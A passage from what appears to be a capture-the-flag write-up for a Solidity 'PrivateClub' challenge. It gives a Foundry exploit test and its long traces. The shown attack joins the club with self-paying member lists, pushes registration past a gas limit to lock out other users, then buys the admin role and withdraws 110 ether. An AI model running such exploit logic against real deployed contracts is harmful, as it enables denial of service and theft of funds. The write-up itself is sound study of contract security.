    ├─ [587] PrivateClub::members(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) [staticcall]
    │   └─ ← true
    ├─ [237504] → new Attack@0x5020029b077577Aae04d569234b7fefA73e33784
    │   └─ ← 964 bytes of code
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [83527] Attack::attack{value: 4000000000000000000}([0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE], 4000000000000000000) 
    │   ├─ [75303] PrivateClub::becomeMember{value: 4000000000000000000}([0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   │   └─ ← ()
    │   │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   │   └─ ← ()
    │   │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   │   └─ ← ()
    │   │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   │   └─ ← ()
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [0] console::f5b1bba9(0000000000000000000000000000000000000000000000008ac7230489e80000) [staticcall]
    │   └─ ← ()
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    ├─ [0] VM::startPrank(user4: [0x90561e5Cd8025FA6F52d849e8867C14A77C94BA0]) 
    │   └─ ← ()
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [2683] PrivateClub::members_(0) [staticcall]
    │   └─ ← adminFriend: [0x659163D39BDF1049a8fFaAebc0Cd4E312934b9b0]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [2683] PrivateClub::members_(1) [staticcall]
    │   └─ ← user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [2683] PrivateClub::members_(2) [staticcall]
    │   └─ ← user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [683] PrivateClub::members_(3) [staticcall]
    │   └─ ← hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [683] PrivateClub::members_(4) [staticcall]
    │   └─ ← Attack: [0x5020029b077577Aae04d569234b7fefA73e33784]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [127552] PrivateClub::becomeMember{value: 5000000000000000000}([0x659163D39BDF1049a8fFaAebc0Cd4E312934b9b0, 0x537C8f3d3E18dF5517a58B3fB9D9143697996802, 0xc0A55e2205B289a967823662B841Bd67Aa362Aec, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0x5020029b077577Aae04d569234b7fefA73e33784]) 
    │   ├─ [0] adminFriend::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] user2::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] user3::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [37472] Attack::receive{value: 1000000000000000000}() 
    │   │   ├─ emit Received(: PrivateClub: [0xe5bFEFEc4C137CB94a2193a2622e2f932cC5f857], : 1000000000000000000)
    │   │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   │   └─ ← ()
    │   │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   │   └─ ← "EvmError: OutOfFund"
    │   │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   │   └─ ← "EvmError: OutOfFund"
    │   │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   │   └─ ← "EvmError: OutOfFund"
    │   │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   │   └─ ← "EvmError: OutOfFund"
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [0] console::f5b1bba9(000000000000000000000000000000000000000000000000a688906bd8b00000) [staticcall]
    │   └─ ← ()
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    ├─ [0] VM::startPrank(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   └─ ← ()
    ├─ [575] Attack::payback() 
    │   ├─ [0] hacker::fallback() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [0] console::f5b1bba9(000000000000000000000000000000000000000000000000a688906bd8b00000) [staticcall]
    │   └─ ← ()
    ├─ [10537] PrivateClub::buyAdminRole{value: 10000000000000000000}(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   ├─ emit OwnershipTransferred(previousOwner: clubAdmin: [0x30D836727A283798C50E33D249422015E7dFaCDb], newOwner: hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE])
    │   └─ ← ()
    ├─ [7611] PrivateClub::adminWithdraw(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE], 110000000000000000000) 
    │   ├─ [0] hacker::fallback{value: 110000000000000000000}() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [458] PrivateClub::owner() [staticcall]
    │   └─ ← hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]
    └─ ← ()

Test result: ok. 1 passed; 0 failed; finished in 15.44ms
```
![](assets/pc14.png)


# Solution: Using foundry(rust framework) - Method 2
- Same as `method 2` of `brownie`; without using any external contracts. But here we have to call `becomeMember()` like 5-6 times.
- `Hack2.t.sol`
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PrivateClub.sol";

contract Hack is Test {
    PrivateClub club;

    address clubAdmin = makeAddr("clubAdmin");
    address adminFriend = makeAddr("adminFriend");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address hacker = makeAddr("hacker");
    uint256 blockGasLimit = 120000; // 121449

    function setUp() public {
        vm.deal(clubAdmin, 100 ether);
        vm.deal(hacker, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);
        vm.startPrank(clubAdmin);

        club = new PrivateClub();
        club.setRegisterEndDate(block.timestamp + 5 days);
        club.addMemberByAdmin(adminFriend);
        address(club).call{value: 100 ether}("");
        vm.stopPrank();

        vm.startPrank(user2);
        address[] memory mForUser2 = new address[](1);
        mForUser2[0] = adminFriend;
        club.becomeMember{value: 1 ether}(mForUser2);
        vm.stopPrank();

        vm.startPrank(user3);
        address[] memory mForUser3 = new address[](2);
        mForUser3[0] = adminFriend;
        mForUser3[1] = user2;
        club.becomeMember{value: 2 ether}(mForUser3);
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(hacker);
        // task1: become member of the club and
        // block future registrations (reason: out of gas - block gas limit)
        // solution:

        address[] memory mForattacker = new address[](club.membersCount());
        for (uint256 i = 0; i < club.membersCount(); i++) {
            mForattacker[i] = hacker;
        }
        uint256 etherAmount = mForattacker.length * 1 ether;

        club.becomeMember{value: etherAmount}(mForattacker);

        // check - hacker is member
        assertTrue(club.members(hacker));

        address[] memory mForattacker2 = new address[](club.membersCount());
        for (uint256 i = 0; i < club.membersCount(); i++) {
            mForattacker2[i] = hacker;
        }
        etherAmount = mForattacker2.length * 1 ether;
        club.becomeMember{value: etherAmount}(mForattacker2);

        address[] memory mForattacker3 = new address[](club.membersCount());
        for (uint256 i = 0; i < club.membersCount(); i++) {
            mForattacker3[i] = hacker;
        }
        etherAmount = mForattacker3.length * 1 ether;
        club.becomeMember{value: etherAmount}(mForattacker3);

        address[] memory mForattacker4 = new address[](club.membersCount());
        for (uint256 i = 0; i < club.membersCount(); i++) {
            mForattacker4[i] = hacker;
        }
        etherAmount = mForattacker4.length * 1 ether;
        club.becomeMember{value: etherAmount}(mForattacker4);

        address[] memory mForattacker5 = new address[](club.membersCount());
        for (uint256 i = 0; i < club.membersCount(); i++) {
            mForattacker5[i] = hacker;
        }
        etherAmount = mForattacker5.length * 1 ether;
        club.becomeMember{value: etherAmount}(mForattacker5);

        vm.stopPrank();

        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);

        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }

        etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();

        assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
        vm.stopPrank();

        vm.startPrank(hacker);
        // task2: buy admin role and withdraw all ether from the club
        // solution:

        club.buyAdminRole{value: 10 ether}(hacker);
        club.adminWithdraw(hacker, address(club).balance);

        // check - hacker is owner of club
        assertEq(club.owner(), hacker);
        assertGt(hacker.balance, 110000000000000000000 - 1);
    }
}
```

## POC
```bash
forge test --match-path test/Hack2.t.sol -vvvv                                                          ⟨12:55:23⟩ ⎭
[⠢] Compiling...
No files changed, compilation skipped

Running 1 test for test/Hack2.t.sol:Hack
[PASS] test_attack() (gas: 619662)
Traces:
  [619662] Hack::test_attack() 
    ├─ [0] VM::startPrank(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   └─ ← ()
    ├─ [2395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 3
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 3
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 3
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 3
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 3
    ├─ [79626] PrivateClub::becomeMember{value: 3000000000000000000}([0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [587] PrivateClub::members(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) [staticcall]
    │   └─ ← true
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 4
    ├─ [53403] PrivateClub::becomeMember{value: 4000000000000000000}([0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 5
    ├─ [60680] PrivateClub::becomeMember{value: 5000000000000000000}([0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 6
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 6
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 6
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 6
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 6
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 6
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 6
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 6
    ├─ [67957] PrivateClub::becomeMember{value: 6000000000000000000}([0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 7
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 7
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 7
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 7
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 7
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 7
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 7
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 7
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 7
    ├─ [75234] PrivateClub::becomeMember{value: 7000000000000000000}([0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    ├─ [0] VM::startPrank(user4: [0x90561e5Cd8025FA6F52d849e8867C14A77C94BA0]) 
    │   └─ ← ()
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 8
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 8
    ├─ [2683] PrivateClub::members_(0) [staticcall]
    │   └─ ← adminFriend: [0x659163D39BDF1049a8fFaAebc0Cd4E312934b9b0]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 8
    ├─ [2683] PrivateClub::members_(1) [staticcall]
    │   └─ ← user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 8
    ├─ [2683] PrivateClub::members_(2) [staticcall]
    │   └─ ← user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 8
    ├─ [683] PrivateClub::members_(3) [staticcall]
    │   └─ ← hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 8
    ├─ [683] PrivateClub::members_(4) [staticcall]
    │   └─ ← hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 8
    ├─ [683] PrivateClub::members_(5) [staticcall]
    │   └─ ← hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 8
    ├─ [683] PrivateClub::members_(6) [staticcall]
    │   └─ ← hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 8
    ├─ [683] PrivateClub::members_(7) [staticcall]
    │   └─ ← hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]
    ├─ [395] PrivateClub::membersCount() [staticcall]
    │   └─ ← 8
    ├─ [111911] PrivateClub::becomeMember{value: 8000000000000000000}([0x659163D39BDF1049a8fFaAebc0Cd4E312934b9b0, 0x537C8f3d3E18dF5517a58B3fB9D9143697996802, 0xc0A55e2205B289a967823662B841Bd67Aa362Aec, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE, 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   ├─ [0] adminFriend::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] user2::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] user3::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   ├─ [0] hacker::fallback{value: 1000000000000000000}() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    ├─ [0] VM::startPrank(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   └─ ← ()
    ├─ [12261] PrivateClub::buyAdminRole{value: 10000000000000000000}(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]) 
    │   ├─ emit OwnershipTransferred(previousOwner: clubAdmin: [0x30D836727A283798C50E33D249422015E7dFaCDb], newOwner: hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE])
    │   └─ ← ()
    ├─ [7611] PrivateClub::adminWithdraw(hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE], 110000000000000000000) 
    │   ├─ [0] hacker::fallback{value: 110000000000000000000}() 
    │   │   └─ ← ()
    │   └─ ← ()
    ├─ [458] PrivateClub::owner() [staticcall]
    │   └─ ← hacker: [0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE]
    └─ ← ()

Test result: ok. 1 passed; 0 failed; finished in 2.16ms
```

![](assets/pc15.png)